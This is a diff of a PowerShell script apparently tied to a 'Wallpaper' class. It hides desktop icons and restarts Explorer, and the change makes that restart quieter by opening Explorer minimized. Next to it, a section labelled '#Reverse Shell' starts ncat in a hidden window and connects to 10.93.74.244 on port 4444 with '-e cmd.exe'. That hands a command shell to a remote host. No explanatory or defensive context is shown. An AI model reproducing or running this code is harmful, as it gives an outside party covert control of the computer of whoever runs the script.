@@ -67,20 +67,13 @@ public class Wallpaper {
 # Hide desktop icons and restart Explorer
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
 Stop-Process -Name explorer -Force
-Start-Process explorer.exe
-
-# Wait for Explorer windows and close them if they pop up
-Start-Sleep -Milliseconds 500
-for ($i=0; $i -lt 10; $i++) {
-    $hwnds = @(New-Object -ComObject Shell.Application).Windows() | Where-Object { $_.Name -like "*File Explorer*" }
-    foreach ($w in $hwnds) { $w.Quit() }
-    Start-Sleep -Milliseconds 200
-}
+Start-Process explorer.exe -WindowStyle Minimized
 
 #Reverse Shell
 Set-Location $env:USERPROFILE
 $Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
 Start-Process -FilePath $Ncat -ArgumentList "10.93.74.244 4444 -e cmd.exe" -WindowStyle Hidden
+
 
 
 
